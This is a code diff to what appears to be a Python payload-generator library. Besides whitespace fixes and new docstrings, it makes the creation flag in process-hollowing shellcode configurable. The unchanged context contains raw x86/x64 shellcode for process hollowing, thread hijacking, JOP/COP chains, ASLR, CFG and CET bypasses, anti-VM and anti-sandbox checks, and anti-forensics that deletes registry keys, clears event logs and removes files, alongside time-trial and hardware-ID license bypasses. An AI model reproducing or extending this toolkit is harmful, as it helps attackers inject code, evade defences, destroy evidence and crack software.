@@ -44,6 +44,12 @@ class PayloadGenerator:
     """
 
     def __init__(self):
+        """Initialize the payload generator.
+        
+        Sets up the payload generation system with support for various
+        exploit payloads including shellcode, ROP chains, code caves,
+        NOP sleds, and bypass techniques for exploitation scenarios.
+        """
         self.logger = logging.getLogger(f"{__name__}.{self.__class__.__name__}")
 
     def generate_nop_sled(self, length: int) -> bytes:
@@ -329,7 +335,7 @@ class PayloadGenerator:
         target_arch = kwargs.get('architecture', 'x86')
         bypass_method = kwargs.get('method', 'max_time')
         preserve_registers = kwargs.get('preserve_registers', False)
-        
+
         if target_arch == 'x64':
             if bypass_method == 'zero_time':
                 # Return zero for time checks (x64)
@@ -361,7 +367,7 @@ class PayloadGenerator:
         bypass_method = kwargs.get('method', 'success')
         hwid_type = kwargs.get('hwid_type', 'generic')
         preserve_stack = kwargs.get('preserve_stack', False)
-        
+
         if target_arch == 'x64':
             if bypass_method == 'fake_hwid':
                 # Return fake but valid-looking HWID (x64)
@@ -403,7 +409,7 @@ class PayloadGenerator:
         bypass_method = kwargs.get('method', 'offline_mode')
         network_type = kwargs.get('network_type', 'generic')
         simulate_connection = kwargs.get('simulate_connection', False)
-        
+
         if target_arch == 'x64':
             if bypass_method == 'simulate_online':
                 # Simulate successful network connection (x64)
@@ -451,6 +457,7 @@ class AdvancedPayloadGenerator:
     """
 
     def __init__(self):
+        """Initialize the advanced payload generator with sophisticated exploit capabilities."""
         self.logger = get_logger(f"{__name__}.{self.__class__.__name__}")
 
     def generate(self, payload_type: str, **kwargs) -> bytes:
@@ -647,7 +654,7 @@ class AdvancedPayloadGenerator:
         mutation_complexity = kwargs.get('complexity', 'basic')
         payload_size = kwargs.get('size', 32)
         mutation_key = kwargs.get('mutation_key', 0x42)
-        
+
         if target_arch == 'x64':
             # 64-bit metamorphic engine
             if mutation_complexity == 'advanced':
@@ -749,7 +756,7 @@ class AdvancedPayloadGenerator:
         dll_base_offset = kwargs.get('dll_base_offset', 0x40100a)
         entry_point_offset = kwargs.get('entry_point_offset', 0x402000)
         use_api_hashing = kwargs.get('use_api_hashing', False)
-        
+
         if target_arch == 'x64':
             # 64-bit reflective DLL loader
             if use_api_hashing:
@@ -843,14 +850,17 @@ class AdvancedPayloadGenerator:
         payload_data = kwargs.get('payload_data', b'\x90' * 16)
         arch = kwargs.get('arch', 'x86')
         suspend_threads = kwargs.get('suspend_threads', True)
-        
+
+        # Set creation flags based on suspend_threads parameter
+        creation_flags = b'\x04\x00\x00\x00' if suspend_threads else b'\x00\x00\x00\x00'  # CREATE_SUSPENDED or normal
+
         if arch == 'x64':
             # x64 process hollowing shellcode
             hollowing_code = (
                 b'\x48\x83\xec\x28' +             # sub rsp, 0x28
                 b'\x48\x31\xc9' +                 # xor rcx, rcx
                 b'\x48\x31\xd2' +                 # xor rdx, rdx
-                b'\x41\xb8\x00\x00\x00\x00' +     # mov r8d, 0 (CREATE_SUSPENDED)
+                b'\x41\xb8' + creation_flags +     # mov r8d, creation_flags
                 b'\x41\xb9\x00\x00\x00\x00' +     # mov r9d, 0
                 b'\xff\x15\x02\x00\x00\x00' +     # call [CreateProcessA]
                 b'\x48\x89\xc1' +                 # mov rcx, rax (process handle)
@@ -885,7 +895,7 @@ class AdvancedPayloadGenerator:
                 b'\x5d' +                         # pop ebp
                 b'\xc3'                           # ret
             )
-        
+
         return hollowing_code
 
     def _generate_thread_hijacking(self, **kwargs) -> bytes:
@@ -894,7 +904,7 @@ class AdvancedPayloadGenerator:
         thread_id = kwargs.get('thread_id', 0)
         payload_addr = kwargs.get('payload_addr', 0x00400000)
         arch = kwargs.get('arch', 'x86')
-        
+
         if arch == 'x64':
             # x64 thread hijacking shellcode
             hijack_code = (
@@ -938,7 +948,7 @@ class AdvancedPayloadGenerator:
                 b'\x5d' +                         # pop ebp
                 b'\xc3'                           # ret
             )
-        
+
         return hijack_code
 
     def _generate_heap_spray(self, **kwargs) -> bytes:
@@ -986,9 +996,9 @@ class AdvancedPayloadGenerator:
         target_addresses = kwargs.get('target_addresses', [])
         gadget_type = kwargs.get('gadget_type', 'jmp_indirect')
         arch = kwargs.get('arch', 'x86')
-        
+
         chain = b''
-        
+
         if arch == 'x64':
             # x64 JOP gadgets
             if gadget_type == 'jmp_indirect':
@@ -1025,7 +1035,7 @@ class AdvancedPayloadGenerator:
                         chain += b'\xff\xe2'  # jmp edx
                     else:
                         chain += b'\xff\xe3'  # jmp ebx
-        
+
         return chain
 
     def _generate_cop_chain(self, **kwargs) -> bytes:
@@ -1035,9 +1045,9 @@ class AdvancedPayloadGenerator:
         gadget_type = kwargs.get('gadget_type', 'call_indirect')
         arch = kwargs.get('arch', 'x86')
         stack_pivot = kwargs.get('stack_pivot', True)
-        
+
         chain = b''
-        
+
         if arch == 'x64':
             # x64 COP gadgets
             if gadget_type == 'call_indirect':
@@ -1055,7 +1065,7 @@ class AdvancedPayloadGenerator:
                         chain += b'\xff\xd1'  # call rcx
                     else:
                         chain += b'\xff\xd2'  # call rdx
-            
+
             if stack_pivot:
                 # Add stack pivot at the end
                 chain += b'\x48\x87\xe0'  # xchg rsp, rax
@@ -1078,11 +1088,11 @@ class AdvancedPayloadGenerator:
                         chain += b'\xff\xd2'  # call edx
                     else:
                         chain += b'\xff\xd3'  # call ebx
-            
+
             if stack_pivot:
                 # Add stack pivot at the end
                 chain += b'\x94'  # xchg esp, eax
-        
+
         return chain
 
     def _generate_aslr_bypass(self, **kwargs) -> bytes:
@@ -1104,7 +1114,7 @@ class AdvancedPayloadGenerator:
         target_addr = kwargs.get('target_addr', 0x00400000)
         size = kwargs.get('size', 0x1000)
         arch = kwargs.get('arch', 'x86')
-        
+
         if technique == 'virtualprotect':
             if arch == 'x64':
                 # x64 VirtualProtect ROP chain
@@ -1152,7 +1162,7 @@ class AdvancedPayloadGenerator:
         else:
             # Default return-to-libc technique
             bypass_code = b'\x90' * 16  # NOP sled as fallback
-        
+
         return bypass_code
 
     def _generate_cfg_bypass(self, **kwargs) -> bytes:
@@ -1161,7 +1171,7 @@ class AdvancedPayloadGenerator:
         target_addr = kwargs.get('target_addr', 0x00400000)
         arch = kwargs.get('arch', 'x64')
         use_stack_pivot = kwargs.get('use_stack_pivot', False)
-        
+
         if technique == 'indirect_call':
             if arch == 'x64':
                 # x64 CFG bypass using indirect calls through valid targets
@@ -1209,14 +1219,14 @@ class AdvancedPayloadGenerator:
         else:
             # Default technique
             bypass_code = b'\x48\x89\xc1\xff\xe1' if arch == 'x64' else b'\x89\xc1\xff\xe1'
-        
+
         if use_stack_pivot:
             # Add stack pivot for enhanced evasion
             if arch == 'x64':
                 bypass_code += b'\x48\x87\xe0'  # xchg rsp, rax
             else:
                 bypass_code += b'\x94'          # xchg esp, eax
-        
+
         return bypass_code
 
     def _generate_cet_bypass(self, **kwargs) -> bytes:
@@ -1224,7 +1234,7 @@ class AdvancedPayloadGenerator:
         technique = kwargs.get('technique', 'shadow_stack')
         arch = kwargs.get('arch', 'x64')
         target_addr = kwargs.get('target_addr', 0x00400000)
-        
+
         if technique == 'shadow_stack':
             if arch == 'x64':
                 # x64 CET shadow stack manipulation
@@ -1281,7 +1291,7 @@ class AdvancedPayloadGenerator:
         else:
             # Default minimal CET bypass
             bypass_code = b'\xf3\x0f\x1e\xfa\x90\x90\xc3' if arch == 'x64' else b'\xf3\x0f\x1e\xfb\x90\x90\xc3'
-        
+
         return bypass_code
 
     def _generate_anti_vm_payload(self, **kwargs) -> bytes:
@@ -1289,9 +1299,9 @@ class AdvancedPayloadGenerator:
         vm_types = kwargs.get('vm_types', ['vmware', 'virtualbox', 'qemu'])
         evasion_level = kwargs.get('evasion_level', 'basic')
         arch = kwargs.get('arch', 'x86')
-        
+
         payload = b''
-        
+
         if 'vmware' in vm_types:
             # VMware detection evasion
             if arch == 'x64':
@@ -1312,7 +1322,7 @@ class AdvancedPayloadGenerator:
                     b'\x74\x05' +                                   # je vm_detected
                     b'\xeb\x10'                                     # jmp continue
                 )
-        
+
         if 'virtualbox' in vm_types:
             # VirtualBox detection evasion
             if arch == 'x64':
@@ -1331,7 +1341,7 @@ class AdvancedPayloadGenerator:
                     b'\x74\x05' +                                   # je vm_detected
                     b'\xeb\x08'                                     # jmp continue
                 )
-        
+
         if 'qemu' in vm_types:
             # QEMU detection evasion
             payload += (
@@ -1342,7 +1352,7 @@ class AdvancedPayloadGenerator:
                 b'\x74\x02' +                                       # je vm_detected
                 b'\xeb\x05'                                         # jmp continue
             )
-        
+
         if evasion_level == 'advanced':
             # Advanced timing-based detection
             if arch == 'x64':
@@ -1369,10 +1379,10 @@ class AdvancedPayloadGenerator:
                     b'\x7c\x02' +                                   # jl vm_detected
                     b'\xeb\x03'                                     # jmp normal_execution
                 )
-        
+
         # Return success (not in VM)
         payload += b'\xb8\x01\x00\x00\x00\xc3'  # mov eax, 1; ret
-        
+
         return payload
 
     def _generate_anti_sandbox_payload(self, **kwargs) -> bytes:
@@ -1381,9 +1391,9 @@ class AdvancedPayloadGenerator:
         evasion_level = kwargs.get('evasion_level', 'basic')
         arch = kwargs.get('arch', 'x86')
         sleep_duration = kwargs.get('sleep_duration', 3000)
-        
+
         payload = b''
-        
+
         if 'timing' in detection_methods:
             # Timing-based sandbox detection
             if arch == 'x64':
@@ -1410,7 +1420,7 @@ class AdvancedPayloadGenerator:
                     b'\x7c\x10' +                               # jl sandbox_detected
                     b'\xeb\x15'                                 # jmp normal_execution
                 )
-        
+
         if 'user_interaction' in detection_methods:
             # Check for user interaction (mouse movement)
             if arch == 'x64':
@@ -1448,7 +1458,7 @@ class AdvancedPayloadGenerator:
                     b'\x83\xc4\x08' +                           # add esp, 8
                     b'\xeb\x10'                                 # jmp normal_execution
                 )
-        
+
         if 'artifacts' in detection_methods:
             # Check for sandbox artifacts
             payload += (
@@ -1462,7 +1472,7 @@ class AdvancedPayloadGenerator:
                 b'\x83\xc4\x08' +                               # add esp, 8
                 b'\xeb\x05'                                     # jmp normal_execution
             )
-        
+
         if evasion_level == 'advanced':
             # Advanced evasion techniques
             payload += (
@@ -1478,10 +1488,10 @@ class AdvancedPayloadGenerator:
                 b'\x7c\x02' +                                   # jl sandbox_detected
                 b'\xeb\x05'                                     # jmp normal_execution
             )
-        
+
         # Normal execution path
         payload += b'\xb8\x01\x00\x00\x00\xc3'  # mov eax, 1; ret
-        
+
         return payload
 
     def _generate_advanced_anti_debug(self, **kwargs) -> bytes:
@@ -1510,9 +1520,9 @@ class AdvancedPayloadGenerator:
         target_areas = kwargs.get('target_areas', ['memory', 'registry', 'files'])
         arch = kwargs.get('arch', 'x86')
         clear_size = kwargs.get('clear_size', 0x10000)
-        
+
         payload = b''
-        
+
         if 'memory_clear' in techniques:
             # Clear sensitive memory regions
             if arch == 'x64':
@@ -1534,7 +1544,7 @@ class AdvancedPayloadGenerator:
                     b'\x6a\x00' +                                   # push 0 (heap handle)
                     b'\xff\x15\x00\x00\x00\x00'                     # call [HeapDestroy]
                 )
-        
+
         if 'artifact_removal' in techniques and 'registry' in target_areas:
             # Remove registry artifacts
             if arch == 'x64':
@@ -1555,7 +1565,7 @@ class AdvancedPayloadGenerator:
                     b'\x68\x00\x00\x00\x00' +                       # push subkey_ptr
                     b'\xff\x15\x00\x00\x00\x00'                     # call [RegDeleteKey]
                 )
-        
+
         if 'log_clearing' in techniques:
             # Clear event logs
             if arch == 'x64':
@@ -1581,7 +1591,7 @@ class AdvancedPayloadGenerator:
                     b'\x6a\x00' +                                   # push NULL
                     b'\xff\x15\x00\x00\x00\x00'                     # call [OpenEventLog]
                 )
-        
+
         if 'artifact_removal' in techniques and 'files' in target_areas:
             # Remove temporary files and traces
             payload += (
@@ -1593,10 +1603,10 @@ class AdvancedPayloadGenerator:
                 b'\x68\x00\x00\x00\x00' +                           # push "*.*"
                 b'\xff\x15\x00\x00\x00\x00'                         # call [FindFirstFile]
             )
-        
+
         # Return success
         payload += b'\xb8\x01\x00\x00\x00\xc3'  # mov eax, 1; ret
-        
+
         return payload
 
     def _generate_advanced_generic(self, **kwargs) -> bytes:
